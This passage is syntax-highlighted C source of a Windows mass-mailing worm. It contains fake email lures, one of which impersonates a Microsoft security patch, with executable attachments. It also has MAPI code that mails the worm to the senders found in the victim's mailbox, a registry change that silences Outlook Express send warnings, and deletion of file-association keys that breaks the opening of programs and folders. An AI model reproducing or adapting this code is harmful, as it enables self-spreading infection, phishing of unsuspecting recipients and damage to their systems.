                                   similar things, but first of all I WISH YOU A HAPPY NEW YEAR, good luck for everything you want to try \r\n \
                                   this year. In the attached file you can find a little gift from me and my new address I am living at the \r\n \
                                   moment, hopefully you give it a try. \r\n \
                                   Bye Bye friend"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szAttName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NewYear.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">11</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">18</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szSubject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Opening of a new restaurant"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Hello, \r\n\r\n \
                                   Next monday will be the big opening of our new restaurant, it is an international place, \r\n \
                                   where you can find new and exciting things to explore. The opening contains a little party \r\n \
                                   and free drinks / food for everyone, we would like to see you and maybe some of your friends or \r\n \
                                   family members there. If you are interested where to find us just look into the attachment. \r\n\r\n \
                                   Best regards and hopefully seeing you next monday, \r\n \
                                   The whole restaurant team."</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szAttName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Invitation.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">12</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">19</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">26</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">13</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szSubject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Information about our new online newspaper"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Hello, \r\n\r\n \
                                   With some other people I plan to make a new online newspaper about political and everyday life \r\n \
                                   topics. The first issue of this new newspaper is planned to be released next month and it would be \r\n \
                                   a great help for us to get some feedback from people not involved in the production. In the attached \r\n \
                                   file you can find the index page of our newspaper and you can write a comment if you like. \r\n\r\n \
                                   Thanks in advance for doing it."</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szAttName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Newspaper.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szSubject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Microsoft: New worm attack! Patch included (KB987655)"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Dear Windows User, \r\n\r\n \
                                   Since last week Microsoft is recognizing new worm attacks all over the world. Informed by several \r\n \
                                   Anti-Virus company, like Kaspersky, Symantec and others we decided to bring out a patch for this as fast as \r\n \
                                   possible. The risk to be infected is very high as the worm targets a problem in the network part of Windows, \r\n \
                                   which means that no user action is needed to be infected. To stop a wider spreading of the destructive \r\n \
                                   program and avoid yourself from any damage install the included patch fixing the problem. \r\n\r\n \
                                   Best regards, \r\n Microsoft Security Team"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szAttName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Patch.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* Load the needed MAPI library */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!(</span><span class="sc11">hInst</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc6">"mapi32.dll"</span><span class="sc0"> </span><span class="sc10">)))</span><span class="sc0"> 
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* %sysdir%\Aeon.exe */</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szAeonAtt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szAeonAtt</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szAeonAtt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Aeon.exe"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Get the needed MAPI functions */</span><span class="sc0">
    </span><span class="sc11">MAPILogon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPMAPILOGON</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogon"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">MAPIFindNext</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPMAPIFINDNEXT</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFindNext"</span><span class="sc10">);</span><span class="sc0">       
    </span><span class="sc11">MAPIReadMail</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPMAPIREADMAIL</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIReadMail"</span><span class="sc10">);</span><span class="sc0">        
    </span><span class="sc11">MAPISendMail</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPMAPISENDMAIL</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">       
    </span><span class="sc11">MAPILogoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPMAPILOGOFF</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc6">"MAPILogoff"</span><span class="sc10">);</span><span class="sc0">
 
    </span><span class="sc1">/* Check if all functions can be used, break if one or more can not be used */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">MAPILogon</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">MAPIFindNext</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">MAPIReadMail</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">MAPISendMail</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">MAPILogoff</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* Try to log in */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MAPILogon</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">lhSession</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0"> 
        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc1">/* Find new Mail and check for success*/</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MAPIFindNext</span><span class="sc10">(</span><span class="sc11">lhSession</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MsgID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MsgID</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> 
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc1">/* Read the Mail and check for success*/</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">MAPIReadMail</span><span class="sc10">(</span><span class="sc11">lhSession</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MsgID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPI_PEEK</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">lpMessage</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> 
                </span><span class="sc1">/* Send the Mail */</span><span class="sc0">
                </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">lpMessage</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPISendMail</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lhSession</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szAeonAtt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSubject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szAttName</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc1">/* Log out */</span><span class="sc0">
        </span><span class="sc11">MAPILogoff</span><span class="sc10">(</span><span class="sc11">lhSession</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0L</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc1">/* Free the library */</span><span class="sc0">
    </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">hInst</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Disable the MAPI Warning when sending the Emails, thanks to Tamiami, DiA, RRLF #7 */</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">DisableMAPIWarning</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwDefaultUserSize</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwWarnDisable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szDefaultUserID</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc1">/* Set HKEY_CURRENT_USER\Identities\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\Software\Microsoft\Outlook Express\5.0\Mail (where
    X stands for a number or letter, depending on the system) " Warn on Mapi Send " = " 0x00000000 (0) " */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Identities"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Default User ID"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">szDefaultUserID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwDefaultUserSize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">szDefaultUserID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">hKey1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szDefaultUserID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Warn on Mapi Send"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_DWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">dwWarnDisable</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">dwWarnDisable</span><span class="sc10">));</span><span class="sc0">
                    
                    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey2</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey1</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Modify HKEY_CLASSES_ROOTS file associations for all important file types, after this double clicking a file will result in an error message */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ModifyHCR</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ACLfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"acwfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AIFFFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ASFFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"aspfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ASXFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AUFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVIFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"batfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CATFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cdafile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ChatFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cmh.file\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"clpfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cmdfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"comfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CompressedFolder\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ConferenceLink\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cplfile\\shell\\cplopen\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dbile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"divfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"divxfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dllfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dpsfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dunfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dxufile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"emfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"exefile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Folder\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fonfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"giffile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
